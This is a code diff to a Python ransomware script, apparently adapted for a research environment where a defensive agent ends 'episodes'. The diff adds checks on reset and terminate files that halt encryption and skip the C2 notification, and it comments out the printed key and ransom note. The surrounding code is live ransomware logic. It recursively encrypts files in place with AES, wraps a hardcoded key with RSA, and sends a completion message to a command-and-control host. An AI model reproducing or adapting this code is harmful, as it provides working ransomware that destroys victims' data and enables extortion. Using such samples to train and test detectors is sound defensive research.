@@ -10,7 +10,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Util import Counter
 from requests import put
 
-from globals import get_config_from_file
+from globals import get_reset_path, get_terminate_path, get_config_from_file
 
 # ============================================================
 # ============ 		GLOBALS 	  ==============
@@ -163,6 +163,14 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
         plaintext = f.read(block_size)  # read number of bytes
 
         while plaintext:
+            # ==============================
+            # RESET CORPUS WHEN EPISODE IS TERMINATED
+            # ==============================
+
+            if path.exists(get_reset_path()) or path.exists(get_terminate_path()):
+                subprocess.call('echo "0" > ./{}'.format(RATE_FILE), shell=True)
+                break
+
             # ==============================
             # GET LATEST CONFIG
             # ==============================
@@ -328,7 +336,29 @@ def encrypt_files(key, start_dirs):
 
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
+        # ==============================
+        # RESET CORPUS WHEN EPISODE IS TERMINATED
+        # ==============================
+
+        reset_path = get_reset_path()
+        terminate_path = get_terminate_path()
+        # print(curr_dir)
+        if path.exists(reset_path) or path.exists(terminate_path):
+            break
+
         for file in discover_files(curr_dir):
+            # ==============================
+            # RESET CORPUS WHEN EPISODE IS TERMINATED
+            # ==============================
+
+            # print(file)
+            if path.exists(reset_path) or path.exists(terminate_path):
+                break
+
+            # ==============================
+            # HANDLE ENCRYPTION
+            # ==============================
+
             if not file.endswith(EXTENSION):
                 all_reported = False  # found new file
 
@@ -419,6 +449,7 @@ def decrypt_files(key, start_dirs):
 
 
 def notify_rw_done():
+    # print("RW done")
     put(url="http://{}:{}{}".format(C2_IP, C2_PORT, C2_RW_ROUTE), data="")
 
 
@@ -432,17 +463,17 @@ def run(encrypt, absolute_paths=None):
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
     encrypted_key_b64 = b64encode(encryptor.encrypt(HARDCODED_KEY)).decode("ascii")
-    print("Encrypted key", encrypted_key_b64, "\n")
+    # print("Encrypted key", encrypted_key_b64, "\n")
 
     if encrypt:
-        print("[COMPANY_NAME]\n\n"
-              "YOUR NETWORK IS ENCRYPTED NOW\n"
-              "USE - TO GET THE PRICE FOR YOUR DATA\n"
-              "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n"
-              "DO NOT RENAME OR MOVE THE FILE\n"
-              "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
-              "[begin_key]\n{}\n[end_key]\n"
-              "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
+        # print("[COMPANY_NAME]\n\n"
+        #       "YOUR NETWORK IS ENCRYPTED NOW\n"
+        #       "USE - TO GET THE PRICE FOR YOUR DATA\n"
+        #       "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n"
+        #       "DO NOT RENAME OR MOVE THE FILE\n"
+        #       "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
+        #       "[begin_key]\n{}\n[end_key]\n"
+        #       "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
         key = HARDCODED_KEY
     else:
         # RSA Decryption function - warning that private key is hardcoded for testing purposes
@@ -454,7 +485,8 @@ def run(encrypt, absolute_paths=None):
         with open("./" + RATE_FILE, "w+"):  # create file if not exists and truncate contents if exists
             pass
         encrypt_files(key, start_dirs)
-        notify_rw_done()
+        if not (path.exists(get_reset_path()) or path.exists(get_terminate_path())):
+            notify_rw_done()  # only notify if legitimately done and not terminated by agent
     else:
         decrypt_files(key, start_dirs)
 
